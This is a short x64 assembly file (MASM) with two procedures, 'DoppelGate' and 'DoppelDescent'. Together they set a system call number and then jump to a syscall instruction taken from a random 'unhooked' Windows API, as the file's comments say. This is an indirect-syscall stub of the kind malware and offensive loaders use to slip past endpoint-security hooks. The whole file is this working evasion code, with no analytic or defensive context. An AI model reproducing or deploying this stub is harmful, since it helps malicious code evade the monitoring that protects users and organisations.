.data    
	wSystemCall DWORD 000h 
 
.code    

EXTERN Fetch_Random_Sys: PROC

DoppelGate PROC        
	mov wSystemCall, 000h         
	mov wSystemCall, ecx        
	ret     
DoppelGate ENDP 
 
DoppelDescent PROC
	mov [rsp +8], rcx          ; Save registers.
	mov [rsp+16], rdx
	mov [rsp+24], r8
	mov [rsp+32], r9
	sub rsp, 28h
	call Fetch_Random_Sys	;grab syscall offset from random unhooked api
	mov r12, rax                           ; Save the address of the syscall
	add rsp, 28h
	mov rcx, [rsp+8]                      ; Restore registers.
	mov rdx, [rsp+16]
	mov r8, [rsp+24]
	mov r9, [rsp+32]
	mov r10, rcx
	mov eax, wSystemCall
	jmp r12                                ; Jump to -> Invoke system call.
DoppelDescent ENDP 

end 
